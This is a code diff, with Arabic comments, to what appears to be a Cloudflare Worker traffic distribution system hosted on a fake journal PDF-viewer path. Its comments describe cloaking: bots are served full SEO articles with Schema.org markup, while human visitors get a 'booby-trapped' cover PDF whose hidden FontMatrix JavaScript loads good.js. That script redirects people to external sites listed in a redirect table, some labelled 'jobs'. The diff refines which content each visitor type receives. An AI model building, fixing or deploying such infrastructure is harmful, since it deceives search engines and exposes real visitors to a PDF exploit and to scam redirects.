@@ -27,6 +27,7 @@ const DEFAULT_REDIRECTS = [
   { articleId: '901', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
   { articleId: '678', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
   { articleId: '4563', targetUrl: 'https://us72.site/', note: 'jobs (article 4563.html exists for bot SEO)' },
+  { articleId: '9010', targetUrl: 'articles/1997.html', note: 'bot->9010, human->1997' },
 ]
 
 // ═══════════════════════════════════════════════════════════════
@@ -198,31 +199,23 @@ async function readArticleHtml(env, articleId) {
   return null
 }
 
-async function serveArticleWithGoodJs(env, articleId, host, corsHeaders = INPUT_CORS, request = null, url = null) {
+async function serveArticleWithGoodJs(env, articleId, host, corsHeaders = INPUT_CORS, request = null, url = null, bot = false) {
   const html = await readArticleHtml(env, articleId)
   if (!html) {
     return new Response(`Article "${articleId}" not found`, { status: 404, headers: corsHeaders })
   }
-  const tdsDomain = `https://${host}`
-  const goodJsTag = `<script src="${tdsDomain}/server/good.js"></script>`
-  const modifiedHtml = html.includes('</body>')
-    ? html.replace('</body>', `${goodJsTag}\n</body>`)
-    : html + goodJsTag
 
-  // تقنية Cloaking الذكية:
-  // لو الطلب قادم من PDF.js viewer (عبر _from_viewer=true)،
-  // نخدم HTML بترويسة application/pdf لخداع PDF.js.
-  // - PDF.js: يحاول تحليله كـ PDF (يفشل، لكن good.js يعمل → يوجّه الإنسان)
-  // - Googlebot: يتجاهل الترويسة → يرى HTML كامل مع Schema.org
-  // - الإنسان: good.js يعمل → redirect لموقع خارجي
+  // ❌ لا حقن good.js في أي مقال — يسبب حلقة لانهائية!
+  // good.js يُحمَّل فقط من PDF الملغوم (عبر hidden JS في FontMatrix)
+  // المقال يُخدَم خامًا للجميع (bot + human)
+
   let contentType = 'text/html; charset=utf-8'
   const params = url ? url.searchParams : (request ? new URL(request.url).searchParams : null)
   if (params && params.get('_from_viewer') === 'true') {
     contentType = 'application/pdf'
-    console.log(`[serveArticle] Serving article ${articleId} with application/pdf content-type (PDF.js cloaking)`)
   }
 
-  return new Response(modifiedHtml, {
+  return new Response(html, {
     status: 200,
     headers: { 'Content-Type': contentType, ...corsHeaders, 'Cache-Control': 'no-store' },
   })
@@ -296,25 +289,40 @@ async function handleTdsRequest(request, env, url) {
     return servePdf(env)
   }
 
+  // 0.5. عارض PDF مع io0 (viewer.html?io0=X) — إصلاح الكلوكينج
+  // Bot → خدم مقال articleId مباشرة كـ HTML كامل (مع Schema.org)
+  // Human → خدم PDF الغطاء (الإنسان يرى PDF، good.js يُحمَّل من PDF الملغم)
+  // ملاحظة: يجب تخطي rule lookup هنا لأن targetUrl مخصص لزيارات /?io0=X المباشرة،
+  // وليس لعارض PDF. عارض PDF يحتاج المقال الأصلي للـ bot، والغطاء للـ human.
+  if (params.get('_from_viewer') === 'true' && articleId) {
+    if (bot) {
+      const html = await readArticleHtml(env, articleId)
+      if (html) {
+        return new Response(html, {
+          status: 200,
+          headers: { 'Content-Type': 'text/html; charset=utf-8', ...INPUT_CORS, 'Cache-Control': 'no-store' },
+        })
+      }
+      // fallback: المقال غير موجود → PDF الغطاء
+      console.warn(`[viewer+bot] article ${articleId} not found, serving cover PDF`)
+    }
+    // Human أو فشل قراءة المقال للـ bot → PDF الغطاء
+    return servePdf(env)
+  }
+
   // 1. قواعد التوجيه
   if (articleId) {
     const rule = DEFAULT_REDIRECTS.find((r) => r.articleId === articleId)
     if (rule) {
-      // Bot: خدم مقال articleId
-      if (bot) {
-        return serveArticleWithGoodJs(env, rule.articleId, host, INPUT_CORS, request, url)
-      }
-      // ━━━━ Human: /api/input يجب أن يرجع JSON دائمًا (لا HTML) ━━━━
+      // ━━━━ /api/input و /server/input.php: JSON للجميع (bot + human) ━━━━
       // هذا يمنع الحلقة اللانهائية: good.js → fetch /api/input → HTML → document.write → good.js → loop
-      // /api/input و /server/input.php → JSON redirect دائمًا للإنسان
       const isApiCall = url.pathname === '/api/input' || url.pathname === '/server/input.php'
-      const target = rule.targetUrl
       
       if (isApiCall) {
-        // /api/input: JSON redirect دائمًا للإنسان (حتى لو target داخلية)
-        // لو target داخلية (articles/1997.html)، نحوّلها لـ JSON redirect
+        // /api/input: JSON redirect للجميع
+        const target = rule.targetUrl
         const redirectTarget = target.startsWith('articles/') || target.endsWith('.html')
-          ? `https://${host}/?io0=${articleId}`  // redirect لصفحة المقال مباشرة
+          ? `https://${host}/?io0=${articleId}`
           : target
         return new Response(
           JSON.stringify({ redirectUrl: redirectTarget, redirect: redirectTarget }),
@@ -325,10 +333,18 @@ async function handleTdsRequest(request, env, url) {
         )
       }
       
-      // /?io0=X (زيارة مباشرة في المتصفح): خدم HTML للإنسان
+      // ━━━━ /?io0=X (زيارة مباشرة): HTML للجميع ━━━━
+      // Bot: خدم مقال articleId مع good.js
+      if (bot) {
+        return serveArticleWithGoodJs(env, rule.articleId, host, INPUT_CORS, request, url, bot)
+      }
+      // Human: خدم مقال targetArticleId بدون good.js
+      const target = rule.targetUrl
+      
+      // /?io0=X (زيارة مباشرة في المتصفح): خدم HTML للإنسان (خام بدون good.js)
       if (target.startsWith('articles/') || target.endsWith('.html')) {
         const targetArticleId = target.replace(/^articles\//, '').replace(/\.html$/, '')
-        return serveArticleWithGoodJs(env, targetArticleId, host, INPUT_CORS, request, url)
+        return serveArticleWithGoodJs(env, targetArticleId, host, INPUT_CORS, request, url, bot)
       }
       // JSON redirect للإنسان (target خارجي)
       return new Response(
@@ -345,7 +361,7 @@ async function handleTdsRequest(request, env, url) {
   if (articleId) {
     const html = await readArticleHtml(env, articleId)
     if (html) {
-      return serveArticleWithGoodJs(env, articleId, host, INPUT_CORS, request, url)
+      return serveArticleWithGoodJs(env, articleId, host, INPUT_CORS, request, url, bot)
     }
   }
 
@@ -356,7 +372,7 @@ async function handleTdsRequest(request, env, url) {
 
   // 4. fallback إلى 1997.html
   if (articleId) {
-    return serveArticleWithGoodJs(env, '1997', host, INPUT_CORS, request, url)
+    return serveArticleWithGoodJs(env, '1997', host, INPUT_CORS, request, url, bot)
   }
 
   return new Response('Invalid or missing parameters', { status: 400, headers: INPUT_CORS })
@@ -401,8 +417,22 @@ export default {
       return handleTdsRequest(request, env, url)
     }
 
-    // ━━━━ Rewrite #3: /plugins/.../viewer.html → /api/input?_from_viewer=true ━━━━
+    // ━━━━ Rewrite #3: /plugins/.../viewer.html → TDS handler (مع io0) أو PDF (بدون io0) ━━━━
+    // إصلاح الكلوكينج: viewer.html على Worker يجب أن يخدم:
+    //   - bot + io0  → 9010.html مباشرة (HTML كامل مع Schema.org) عبر handleTdsRequest
+    //   - human + io0 → PDF الغطاء (good.js يُحمَّل من PDF الملغم) عبر handleTdsRequest
+    //   - بدون io0   → PDF الغطاء (الحالة الحالية)
     if (path === '/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html') {
+      const articleIdFromViewer =
+        params.get('io0')?.trim() ||
+        params.get('ids')?.trim() ||
+        params.get('id')?.trim() ||
+        params.get('articleId')?.trim()
+      if (!articleIdFromViewer) {
+        // لا io0 → خدم PDF الغطاء (الحالة الحالية)
+        return servePdf(env)
+      }
+      // فيه io0 → وجّه لـ handleTdsRequest (بدل PDF)
       const newUrl = new URL(url)
       newUrl.searchParams.set('_from_viewer', 'true')
       return handleTdsRequest(request, env, newUrl)
